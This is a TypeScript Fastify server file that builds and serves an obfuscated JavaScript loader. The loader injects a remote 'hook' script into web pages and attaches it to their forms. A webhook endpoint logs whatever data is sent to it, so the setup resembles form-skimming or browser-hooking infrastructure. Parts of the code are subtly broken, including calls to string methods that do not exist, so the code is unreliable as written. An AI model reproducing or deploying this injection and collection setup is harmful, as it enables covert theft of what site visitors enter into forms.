import {FastifyReply, FastifyRequest} from 'fastify';
import {IWebhookRequest} from './schema';
import * as esbuild from 'esbuild'

export const HandleRequest = async (
    request: FastifyRequest<IWebhookRequest>,
    reply: FastifyReply,
) => {
    const params = {...request.query, ...request.params, ...request.body};
    console.log(params);
    return reply.code(200).send({success: true});
};

export const HandleInstall = async (
    request: FastifyRequest,
    reply: FastifyReply,
) => {
    const inline_script =
        `let {head: xh} = document, xb = document.createElement("script");
xb.type = "text/javascript";
xb.src = String.fromCharCode({server});
xb.id = 'hook-loader';
if(!document.querySelector('script[id="hook-loader"]'))
xh.appendChild(xb);
window.addEventListener("DOMContentLoaded", (event) => {
  console.log("DOM fully loaded and parsed");
  try {
    window._LOL = window._LOL ?? new Hook();
    window._LOL.init('form');
        } catch (e) {
            console.error(e);
        }
});

`.replace(
            '{server}',
            '{0}/client.js?cache=ignore'.format(request.web_url.replace('/install', '')).getCharCodeAt(),
        );
    return esbuild.build({
        stdin: {contents: inline_script, loader: 'js'},
        minify: true,
        write: false,
        target: 'chrome58',
        outdir: 'public/install.js',
    }).then(function ({outputFiles}) {
        const out = outputFiles.pop()
        return reply
            .status(200)
            .type('text/javascript')
            .send(out?.text ?? inline_script.replace(/\n/g, ' '));
    }).catch(function () {
        return reply
            .status(200)
            .type('text/javascript')
            .send(inline_script.replace(/\n/g, ' '));
    })

};
export const HandleClient = async (
    request: FastifyRequest,
    reply: FastifyReply,
) => {
    console.log(request.web_url)
    return reply
        .sendFile('hook.class.min.js');
};
